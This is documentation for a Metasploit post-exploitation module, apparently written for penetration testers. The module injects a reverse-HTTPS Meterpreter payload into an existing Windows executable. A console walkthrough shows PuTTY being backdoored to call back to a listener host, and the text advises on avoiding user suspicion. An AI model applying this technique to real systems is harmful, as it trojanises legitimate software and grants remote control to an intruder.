## Overview
This module inserts a payload into an existing PE file on a remote
machine.  When a user launches the binary, the payload will run
as a thread within the process with the same privs.

## Options
LHOST  IP of host that will receive the connection from the payload.
LPORT  Port for Payload to connect to.
OPTIONS Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
PAYLOAD Windows Payload to inject into the targer executable.
SESSION The session to run this module on.
TARGETPE Path of the target executable to Path of the target executable to be injected

## Limitations
This process is not reverse-able.  If you would like to return the
binary to it's original state, save a copy.

THE PAYLOAD WILL NOT SPAWN AN INDEPENDENT PROCESS/THREAD AND THE SESSION
WILL DIE WITH THE BINARY AND/OR WILL KILL THE BINARY WHEN THE SESSION
EXITS.  Be careful closing sessions that were spawned using this method!

If a setting is wrong, it may cause the binary to fail to launch,
alerting the user to possible shinnanigans.

## Vulnerable Applications
`Vulnerable` is a bad term; this module inserts shellcode into a pe
file.  That means any Windows pe files are `vulnerable`.
Be aware that some files like calc.exe on later Windows versions
are not entirely normal in their behvior and are not `vulnerable`

## Verification Steps
* get session on target
* `use post/windows/manage/peinjector`
* `set payload <payload>`
* `set lport <lport>`
* `set lhost <lhost>`
* `set targetpe <*.exe>`
* `run`

## Usage
```
meterpreter > sysinfo
Computer        : WIN10X64-1511
OS              : Windows 10 (Build 10586).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use post/windows/manage/peinjector 
msf5 post(windows/manage/peinjector) > show options

Module options (post/windows/manage/peinjector):

   Name      Current Setting                    Required  Description
   ----      ---------------                    --------  -----------
   LHOST                                        yes       IP of host that will receive the connection from the payload.
   LPORT     4433                               no        Port for Payload to connect to.
   OPTIONS                                      no        Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
   PAYLOAD   windows/meterpreter/reverse_https  no        Windows Payload to inject into the targer executable.
   SESSION                                      yes       The session to run this module on.
   TARGETPE                                     no        Path of the target executable to be injected

msf5 post(windows/manage/peinjector) > set lhost 192.168.135.111
lhost => 192.168.135.111
msf5 post(windows/manage/peinjector) > set lport 4561
lport => 4561
msf5 post(windows/manage/peinjector) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf5 post(windows/manage/peinjector) > set session 1
session => 1
msf5 post(windows/manage/peinjector) > set targetpe 'C:\users\msfuser\downloads\puttyx64.exe'
targetpe => C:\users\msfuser\downloads\puttyx64.exe
msf5 post(windows/manage/peinjector) > show options

Module options (post/windows/manage/peinjector):

   Name      Current Setting                          Required  Description
   ----      ---------------                          --------  -----------
   LHOST     192.168.135.111                          yes       IP of host that will receive the connection from the payload.
   LPORT     4561                                     no        Port for Payload to connect to.
   OPTIONS                                            no        Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
   PAYLOAD   windows/x64/meterpreter/reverse_https    no        Windows Payload to inject into the targer executable.
   SESSION   1                                        yes       The session to run this module on.
   TARGETPE  C:\users\msfuser\downloads\puttyx64.exe  no        Path of the target executable to be injected

msf5 post(windows/manage/peinjector) > run

[*] Running module against WIN10X64-1511
[*] Generating payload
[*] Injecting Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet) into the executable C:\users\msfuser\downloads\puttyx64.exe
[+] Successfully injected payload into the executable: C:\users\msfuser\downloads\puttyx64.exe
[*] Post module execution completed
msf5 post(windows/manage/peinjector) >
```

